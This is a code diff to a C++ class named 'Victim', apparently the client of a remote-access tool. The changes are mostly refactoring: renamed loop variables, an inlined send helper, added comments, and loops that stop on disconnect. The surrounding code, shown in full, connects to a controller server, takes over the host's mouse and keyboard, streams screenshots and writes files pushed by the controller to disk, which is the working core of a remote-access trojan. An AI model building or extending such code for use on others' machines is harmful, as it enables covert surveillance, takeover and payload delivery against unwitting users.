@@ -13,7 +13,7 @@ Victim::Victim()
     for (auto c : path)
         tempPath += char(c);
     exePath = tempPath.substr(0, tempPath.find_last_of('\\'));
-    exeName = tempPath.substr(tempPath.find_last_of('\\') + 1);
+    std::string exeName = tempPath.substr(tempPath.find_last_of('\\') + 1);
 
     //if needed create the context file
     std::ofstream createFile(exePath + "\\vcontext.txt", std::ios::app);
@@ -68,16 +68,16 @@ int Victim::controlVictim()
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
             isConnected = false, controlMouse = false, controlKeyboard = false, isSharingScreen = false;
-            for (int i = 0; i < 255; i++) {
-                if (!keysStates[i])
+            for (int vkc = 0; vkc < 255; vkc++) {
+                if (!keysStates[vkc])
                     continue;
-                keysStates[i] = false;
+                keysStates[vkc] = false;
 
                 //if its a mouse key, treat it accordingly
-                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
-                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+                if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
+                    Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
                 else
-                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
             }
             connectServer();
         }
@@ -87,16 +87,16 @@ int Victim::controlVictim()
         
         //exit program
         if (cmd == 'e') {
-            for (int i = 0; i < 255; i++) {
-                if (!keysStates[i])
+            for (int vkc = 0; vkc < 255; vkc++) {
+                if (!keysStates[vkc])
                     continue;
-                keysStates[i] = false;
+                keysStates[vkc] = false;
 
                 //if its a mouse key, treat it accordingly
-                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
-                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+                if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
+                    Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
                 else
-                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
             }
             isRunning = false;
         }
@@ -186,6 +186,7 @@ int Victim::controlVictim()
         }
         //create new file
         else if (cmd == 'f') {
+            //apparently there is another file
             if (file != nullptr) {
                 file->close();
                 delete file;
@@ -193,7 +194,7 @@ int Victim::controlVictim()
 
                 p.clear();
                 p << sf::Uint8('h');
-                sendServer(p);
+                server.send(p);
 
                 continue;
             }
@@ -203,13 +204,15 @@ int Victim::controlVictim()
         }
         //write file
         else if (cmd == 'o') {
+            //file doesnt exist
             if (file == nullptr) {
                 p.clear();
                 p << sf::Uint8('h');
-                sendServer(p);
+                server.send(p);
 
                 continue;
             }
+            //file isnt good
             else if (file->bad()) {
                 file->close();
                 delete file;
@@ -217,30 +220,34 @@ int Victim::controlVictim()
 
                 p.clear();
                 p << sf::Uint8('h');
-                sendServer(p);
+                server.send(p);
 
                 continue;
             }
 
+            //write data
             const void* buffer = p.getData();
             auto data = static_cast<const char*>(buffer);
             ++data;
             size_t size = p.getDataSize() - 1;
             file->write(data, size);
 
+            //tell controller that it is ready to receive next packet
             p.clear();
             p << sf::Uint8('y');
-            sendServer(p);
+            server.send(p);
         }
         //close file
         else if (cmd == 'i') {
+            //file doesnt exist
             if (file == nullptr) {
                 p.clear();
                 p << sf::Uint8('h');
-                sendServer(p);
+                server.send(p);
 
                 continue;
             }
+            //file isnt good
             else if (file->bad()) {
                 file->close();
                 delete file;
@@ -248,7 +255,7 @@ int Victim::controlVictim()
 
                 p.clear();
                 p << sf::Uint8('h');
-                sendServer(p);
+                server.send(p);
 
                 continue;
             }
@@ -260,6 +267,7 @@ int Victim::controlVictim()
             delete file;
             file = nullptr;
 
+            //add extention to file
             std::string newName = filePath + ext;
             std::rename(filePath.c_str(), newName.c_str());
         }
@@ -293,7 +301,7 @@ void Victim::keepAwake()
         if (isConnected && Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
             sf::Packet p;
             p << sf::Uint8('r');
-            sendServer(p);
+            server.send(p);
             lastAwakeSignal = Mlib::currentTime().asMil();
         }
         //sleep to save computing power
@@ -312,7 +320,7 @@ init:
     sf::Packet p;
     p << sf::Uint8(VICTIM_VERSION) << name;
     //tell server the role and the name
-    if (sendServer(p) == sf::Socket::Disconnected)
+    if (server.send(p) == sf::Socket::Disconnected)
         goto connect;
 
     p.clear();
@@ -336,40 +344,44 @@ init:
 void Victim::createNewFile()
 {
     filePath = Mlib::getSaveFilePath("All Files (*.*)\0*.*\0");
+    //failed to retrieve path
     if (filePath == "") {
         sf::Packet p;
         p << sf::Uint8('h');
-        sendServer(p);
+        server.send(p);
         return;
     }
 
     std::string loc = filePath.substr(0, filePath.find_last_of('\\'));
     std::string name = filePath.substr(filePath.find_last_of('\\'), filePath.size() - 1);
     name = name.substr(0, name.find_first_of('.'));
-
     filePath = loc + name;
+    //failed to process path
     if (filePath == "") {
         sf::Packet p;
         p << sf::Uint8('h');
-        sendServer(p);
+        server.send(p);
         return;
     }
+
     file = new std::ofstream(filePath, std::ios::binary | std::ios::out);
+    //failed to create file
     if (file->bad()) {
         sf::Packet p;
         p << sf::Uint8('h');
-        sendServer(p);
+        server.send(p);
         return;
     }
 
+    //tell controller that it is ready to receive next packet
     sf::Packet p;
     p << sf::Uint8('y');
-    sendServer(p);
+    server.send(p);
 }
 
-void Victim::pinMouse()
+void Victim::pinMouse() const
 {
-    while (true) {
+    while (isConnected) {
         if (controlMouse) {
             Mlib::Mouse::setPos(mousePos);
             Mlib::sleep(Mlib::milliseconds(1));
@@ -385,7 +397,7 @@ void Victim::shareScreen()
     const int width = GetDeviceCaps(hScreenDC, HORZRES);
     const int height = GetDeviceCaps(hScreenDC, VERTRES);
 
-    while (true) {
+    while (isConnected) {
         if (!isSharingScreen) {
             Mlib::sleep(Mlib::milliseconds(300));
             continue;
@@ -427,7 +439,7 @@ void Victim::shareScreen()
         sf::Packet p;
         p << sf::Uint8('t');
         p.append(sendBuffer, size_t(1280 * 720));
-        sendServer(p);
+        server.send(p);
         std::cout << "SENT";
 
         DeleteObject(hBitmap);
@@ -439,12 +451,4 @@ void Victim::shareScreen()
 
     DeleteDC(hMemoryDC);
     ReleaseDC(NULL, hScreenDC);
-}
-
-sf::Socket::Status Victim::sendServer(sf::Packet& p)
-{
-    //mutex.lock();
-    auto state = server.send(p);
-    //mutex.unlock();
-    return state;
 }
